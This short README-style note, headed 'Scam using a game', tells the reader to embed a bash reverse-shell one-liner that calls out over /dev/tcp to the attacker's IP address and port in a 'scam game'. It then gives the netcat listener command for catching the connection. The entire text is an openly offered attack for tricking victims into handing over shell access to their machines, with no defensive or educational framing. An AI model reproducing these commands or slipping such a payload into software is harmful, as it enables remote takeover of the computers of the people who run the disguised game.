#Scam using a game

The command to insert in your scam game is as commented below: <br/>
/bin/bash -i >/dev/tcp/{YOUR_LISTENING_IP_ADDRESS}/{THE_PORT_YOURE_LISTENING_TO} 0<&1 2>&1<br/>
The command to use for entry is: <br/>
nc -lnvp PORT -s YOUR_IP_ADDRESS<br/>
Note: The ip address in your file is the same as the ip you'll be listening using.
